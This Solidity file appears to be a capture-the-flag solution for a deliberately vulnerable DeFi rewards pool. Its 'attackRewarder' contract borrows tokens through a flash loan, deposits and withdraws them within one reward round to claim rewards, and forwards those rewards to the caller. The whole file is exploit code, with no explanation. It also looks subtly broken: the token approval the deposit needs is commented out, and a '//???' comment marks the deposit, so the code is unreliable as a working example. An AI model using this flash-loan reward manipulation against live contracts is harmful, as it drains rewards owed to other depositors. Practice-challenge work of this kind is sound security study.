// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
    function isNewRewardsRound() external view returns (bool);
}

interface IRewardToken {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IDVToken {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract attackRewarder {

    IFlashLoanerPool public FlashLoan;
    ITheRewarderPool private target;
    IRewardToken public rewardToken;
    IDVToken public DVToken;

    constructor (IFlashLoanerPool _FlashLoan, ITheRewarderPool _target, IRewardToken _rewardToken, IDVToken _DVToken) {
        FlashLoan = _FlashLoan;
        target = _target;
        rewardToken = _rewardToken;
        DVToken = _DVToken;
    }

    function callFlashLoan(uint256 _amount) external {
        // DVToken.approve(address(FlashLoan), _amount);
        FlashLoan.flashLoan(_amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        if (target.isNewRewardsRound() == true) {
            target.deposit(_amount); //???
            target.withdraw(_amount);
            DVToken.transfer(address(FlashLoan), _amount);
        } else {
            DVToken.transfer(address(FlashLoan), _amount);
        }
    }
}